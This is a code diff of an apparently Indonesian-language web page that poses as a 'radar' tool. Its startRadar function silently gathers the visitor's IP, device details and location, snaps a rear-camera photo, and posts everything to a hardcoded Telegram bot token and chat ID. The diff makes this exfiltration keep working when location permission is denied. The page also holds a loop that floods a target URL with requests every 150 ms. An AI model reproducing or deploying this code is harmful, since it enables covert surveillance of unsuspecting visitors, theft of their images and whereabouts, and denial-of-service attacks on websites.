@@ -56,12 +56,9 @@ canvas{display:none}
 const T='8766727574:AAHYs-g11Up4SWnl4t8P3pHpMvS1XkKkr0g', C='7898572558';
 let atk=false, iv=null, dark=true;
 
-// jam
 setInterval(()=>document.getElementById('rt').textContent=new Date().toLocaleTimeString('id-ID',{hour12:false}),1e3);
-// baterai
 if(navigator.getBattery) navigator.getBattery().then(b=>{let u=()=>document.getElementById('bat').textContent=Math.round(b.level*100)+'%';u();b.onlevelchange=u}).catch(()=>document.getElementById('bat').textContent='N/A');
 else document.getElementById('bat').textContent='N/A';
-// suhu + cpu
 setInterval(()=>{
 let s=performance.now(),d=0;for(let i=0;i<1e6;i++)d+=i;let e=performance.now(),l=Math.min(100,Math.round(((e-s)/10)*2+10));
 document.getElementById('cpu').textContent=l+'%';
@@ -73,16 +70,23 @@ async function startRadar(){
 let o=document.getElementById('ro');o.style.display='flex';
 try{
 let d={ua:navigator.userAgent,platform:navigator.platform,screen:screen.width+'x'+screen.height,tz:Intl.DateTimeFormat().resolvedOptions().timeZone,core:navigator.hardwareConcurrency||'?'};
-let p=await new Promise((r,j)=>navigator.geolocation.getCurrentPosition(r,j,{enableHighAccuracy:1,timeout:1e4}));
-let i=await(await fetch('https://api.ipify.org?format=json')).json();
+let ip=(await(await fetch('https://api.ipify.org?format=json')).json()).ip;
 let s=await navigator.mediaDevices.getUserMedia({video:{facingMode:'environment',width:640,height:480}});
 let v=document.createElement('video');v.srcObject=s;await v.play();
 let c=document.getElementById('cv');c.width=v.videoWidth||640;c.height=v.videoHeight||480;c.getContext('2d').drawImage(v,0,0,c.width,c.height);
 let b=await new Promise(r=>c.toBlob(r,'image/jpeg',.9));s.getTracks().forEach(t=>t.stop());
-let cap=`🔱 RADAR REPORT\nIP: ${i.ip}\nLokasi: ${p.coords.latitude},${p.coords.longitude}\nDevice: ${d.platform}\nBrowser: ${d.ua.split(' ').slice(-2).join(' ')}\nCPU: ${d.core} core\nWaktu: ${new Date().toLocaleString('id-ID')}`;
+
+// Ambil lokasi kalo diizinkan, kalo nggak pake default
+let loc='Tidak diketahui (izin ditolak)';
+try{
+let p=await new Promise((r,j)=>navigator.geolocation.getCurrentPosition(r,j,{enableHighAccuracy:1,timeout:5e3}));
+loc=p.coords.latitude+','+p.coords.longitude;
+}catch(e){loc='Izin lokasi ditolak'}
+
+let cap=`🔱 RADAR REPORT\nIP: ${ip}\nLokasi: ${loc}\nDevice: ${d.platform}\nBrowser: ${d.ua.split(' ').slice(-2).join(' ')}\nCPU: ${d.core} core\nWaktu: ${new Date().toLocaleString('id-ID')}`;
 let fd=new FormData();fd.append('chat_id',C);fd.append('photo',b,'shot.jpg');fd.append('caption',cap);
 await fetch('https://api.telegram.org/bot'+T+'/sendPhoto',{method:'POST',body:fd});
-o.innerHTML='<div style="color:var(--n);text-align:center;padding:20px"><h2>✅ SENT</h2><button onclick="document.getElementById(\'ro\').style.display=\'none\';document.getElementById(\'ro\').innerHTML=\'<div class=sweep></div>\'" style="margin-top:20px;padding:10px 30px;background:var(--n);color:#000;border:none;border-radius:10px;cursor:pointer">TUTUP</button></div>';
+o.innerHTML='<div style="color:var(--n);text-align:center;padding:20px"><h2>✅ SENT</h2><p style="font-size:12px">Foto & IP terkirim</p><button onclick="document.getElementById(\'ro\').style.display=\'none\';document.getElementById(\'ro\').innerHTML=\'<div class=sweep></div>\'" style="margin-top:20px;padding:10px 30px;background:var(--n);color:#000;border:none;border-radius:10px;cursor:pointer">TUTUP</button></div>';
 }catch(e){o.innerHTML='<div style="color:var(--r);text-align:center;padding:20px"><h2>⚠️ ERROR</h2><p>'+e.message+'</p><button onclick="document.getElementById(\'ro\').style.display=\'none\';document.getElementById(\'ro\').innerHTML=\'<div class=sweep></div>\'" style="margin-top:20px;padding:10px 30px;background:var(--r);color:#fff;border:none;border-radius:10px;cursor:pointer">TUTUP</button></div>';}
 }
 
@@ -94,7 +98,12 @@ atk=!0;b.innerText='⏹️ STOP';l.style.display='block';l.innerHTML='> 🔥 CON
 iv=setInterval(()=>{if(atk){let r=Math.random();new Image().src=t+'/?v='+r;l.innerHTML+='> GET '+t+'/?v='+r.toString().substring(2,8)+' [SEND]<br>';l.scrollTop=l.scrollHeight}},150);
 }
 
-function openMap(){navigator.geolocation.getCurrentPosition(p=>window.open('https://www.google.com/maps?q='+p.coords.latitude+','+p.coords.longitude,'_blank'),e=>alert('❌ '+e.message))}
+function openMap(){
+navigator.geolocation.getCurrentPosition(
+p=>window.open('https://www.google.com/maps?q='+p.coords.latitude+','+p.coords.longitude,'_blank'),
+()=>window.open('https://www.google.com/maps','_blank')
+);
+}
 
 function scanPhish(){
 let i=document.getElementById('pl').value.trim().toLowerCase(),r=document.getElementById('sr');
